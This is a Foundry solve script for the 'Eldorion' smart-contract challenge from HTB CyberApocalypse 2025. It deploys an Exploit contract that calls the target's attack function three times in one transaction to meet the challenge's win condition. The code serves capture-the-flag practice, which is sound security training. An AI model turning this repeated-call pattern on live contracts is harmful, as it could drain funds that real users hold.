pragma solidity ^0.8.26;


import {Script} from "forge-std/Script.sol";

import {Setup} from "src/HTB-CyberApocalypse-2025/Eldorion/Setup.sol";
import {Eldorion} from "src/HTB-CyberApocalypse-2025/Eldorion/Eldorion.sol";



contract Solve is Script{
    function run()public{
        vm.startBroadcast();
        Setup _setup=Setup(/**YOUR_SETUP_ADDRESS */);
        Eldorion _eldorion=_setup.TARGET();
        Exploit exploit=new Exploit();
        exploit.pwn(_eldorion); 
        require(_setup.isSolved(),"Exploit Failed");
        vm.stopBroadcast();
    }

}


contract Exploit{

    function pwn(Eldorion _eldorion)public{
        for(uint256 i=0;i<3;i++){
            _eldorion.attack(100);
        }
    }
}